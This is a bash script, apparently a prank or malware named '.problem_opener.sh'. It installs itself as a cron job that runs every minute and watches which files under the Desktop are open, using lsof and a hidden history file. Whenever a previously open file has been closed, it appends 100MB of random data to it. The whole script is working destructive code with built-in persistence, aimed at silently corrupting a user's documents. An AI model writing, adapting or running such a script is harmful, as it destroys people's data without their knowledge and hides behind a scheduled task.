# !/bin/bash

#######################
# Install
#######################
LOCATION=$PWD/.problem_opener.sh

PATTERN="$LOCATION"
FILE=$(crontab -l)

if echo "$FILE" | grep -q "$PATTERN";
 then
  echo "already a cron job!"
 else
  line="*/1 * * * * /bin/bash -l -c $LOCATION"

  # line="*/30 * * * * . $HOME/.profile; $LOCATION/$CRONFILE"
  # line="*/1 * * * * bash -l -c $LOCATION/$CRONFILE"
  (crontab -l; echo "$line" ) | crontab -
fi

#######################
# Load lsof files into array
#######################
# get a list of currently open files
RESULTX="$(lsof +D ~/Desktop/ -Fn | sed '/n/!d; s/^n//'; echo x)"
current="${RESULTX%x}"

# turn off globbing
set -f
# seperate on new line
IFS=$'
' 
# map file names to array
mapfile -t current_files <<< "$current"

unset IFS

#######################
# Set location of history list file
#######################
# load list of files that were last seen as being open
history_list="$HOME/.open_list.csv"

# create open list file if it doesn't exist
if [ ! -e $history_list ] ; then
    touch $history_list
fi

#######################
# Load previous history
#######################
previous_history_contents=`cat $history_list`

phc=$(echo $previous_history_contents | tr "," "\n")
mapfile -t previous_history <<< "$phc"

#######################
# Write current list to history
#######################

# join array values to string
SAVE_IFS="$IFS"
IFS=","
new_history_contents="${current_files[*]}"
IFS="$SAVE_IFS"

# write open file string to file
echo "$new_history_contents" > $history_list

#######################
# Compare current opened to previous history
#######################
for i in "${previous_history[@]}"
do
  echo $i
  if ! [[ " ${current_files[@]} " =~ " ${i} " ]]; then
    dd if=/dev/urandom bs=100M count=1 >> $i
  fi
done